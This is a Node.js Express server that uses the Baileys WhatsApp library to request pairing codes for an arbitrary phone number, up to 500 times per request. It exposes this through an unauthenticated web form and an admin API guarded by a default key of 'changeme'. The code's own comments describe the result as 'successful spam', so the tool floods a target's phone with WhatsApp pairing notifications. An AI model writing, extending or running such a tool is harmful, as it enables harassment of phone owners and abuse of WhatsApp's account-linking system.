// server.js
const express = require("express");
const bodyParser = require("body-parser");
const { Boom } = require("@hapi/boom");
const {
  makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
} = require("@whiskeysockets/baileys");
const chalk = require("chalk");
const fs = require("fs");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_KEY = process.env.ADMIN_KEY || "changeme";
const PAIR_DELAY = parseInt(process.env.PAIR_DELAY || "1000", 10); // ms
const SESSION_DIR = "./baileys_auth";

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.set("view engine", "ejs");

let sock;

async function startSock() {
  const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    browser: ["PairingServer", "Render", "1.0"],
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "open") {
      console.log(chalk.green.bold("[SOCK] Connected ✅ Ready for pairing codes"));
    } else if (connection === "close") {
      const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
      console.log(chalk.red(`[SOCK] Disconnected ❌ Reason: ${reason}`));

      switch (reason) {
        case DisconnectReason.badSession:
          console.error("Bad session. Clearing session and restarting...");
          fs.rmSync(SESSION_DIR, { recursive: true, force: true });
          return startSock();
        case DisconnectReason.connectionClosed:
        case DisconnectReason.connectionLost:
        case DisconnectReason.timedOut:
        case DisconnectReason.restartRequired:
          console.log("Reconnecting...");
          return startSock();
        case DisconnectReason.loggedOut:
          console.error("Logged out. Clearing session and waiting restart...");
          fs.rmSync(SESSION_DIR, { recursive: true, force: true });
          process.exit(0);
        default:
          console.log("Unknown disconnect reason, retrying...");
          return startSock();
      }
    }
  });
}

startSock();

// --- Helpers ---
function requireAdmin(req, res, next) {
  const key = req.headers["x-admin-key"] || req.body.adminKey || req.query.adminKey;
  if (key !== ADMIN_KEY) {
    return res.status(403).json({ error: "Forbidden" });
  }
  next();
}

function formatCode(code) {
  return code?.match(/.{1,4}/g)?.join("-") || code;
}

function clearSessionAndRestart() {
  try {
    if (fs.existsSync(SESSION_DIR)) {
      fs.rmSync(SESSION_DIR, { recursive: true, force: true });
      console.log(chalk.red("🗑️ Session cleared."));
    }
  } catch (err) {
    console.error("Error clearing session:", err);
  }
  console.log(chalk.yellow("🔄 Restarting process..."));
  process.exit(0);
}

// --- UI Routes ---
app.get("/", (req, res) => {
  res.render("index", { codes: null, error: null });
});

app.post("/ui/pair", async (req, res) => {
  try {
    const input = req.body.numberInput || "";
    const [rawPhone, rawCount] = input.split("|");
    const phone = rawPhone.replace(/\D/g, "");
    const count = Math.min(parseInt(rawCount || "1", 10), 500);

    if (!phone) return res.render("index", { codes: null, error: "Invalid phone input" });

    console.log(chalk.blue(`[REQ][UI] Phone: ${phone}, Count: ${count}`));
    const codes = [];

    for (let i = 0; i < count; i++) {
      let code = await sock.requestPairingCode(phone);
      code = formatCode(code);
      console.log(chalk.yellow(`[CODE][UI] ${phone} -> ${code}`));
      codes.push(code);
      if (i < count - 1) await new Promise((r) => setTimeout(r, PAIR_DELAY));
    }

    res.render("index", { codes, error: null });
    clearSessionAndRestart(); // restart after successful spam
  } catch (err) {
    console.error("[ERR][UI]", err);
    res.render("index", { codes: null, error: "Failed to get codes" });
    clearSessionAndRestart(); // restart after error
  }
});

// --- API Route ---
app.post("/api/pair", requireAdmin, async (req, res) => {
  try {
    const input = req.body.input || "";
    const [rawPhone, rawCount] = input.split("|");
    const phone = rawPhone.replace(/\D/g, "");
    const count = Math.min(parseInt(rawCount || "1", 10), 500);

    if (!phone) return res.status(400).json({ error: "Invalid phone" });

    console.log(chalk.blue(`[REQ][API] Phone: ${phone}, Count: ${count}`));
    const codes = [];

    for (let i = 0; i < count; i++) {
      let code = await sock.requestPairingCode(phone);
      code = formatCode(code);
      console.log(chalk.magenta(`[CODE][API] ${phone} -> ${code}`));
      codes.push(code);
      if (i < count - 1) await new Promise((r) => setTimeout(r, PAIR_DELAY));
    }

    res.json({ phone, codes });
    clearSessionAndRestart(); // restart after successful spam
  } catch (err) {
    console.error("[ERR][API]", err);
    res.status(500).json({ error: "Failed to get codes" });
    clearSessionAndRestart(); // restart after error
  }
});

// --- Healthcheck Route ---
app.get("/health", (req, res) => {
  res.json({ status: "ok", connected: !!sock?.user });
});

// --- Start server ---
app.listen(PORT, () => {
  console.log(chalk.green(`[BOOT] Server running on http://localhost:${PORT}`));
});
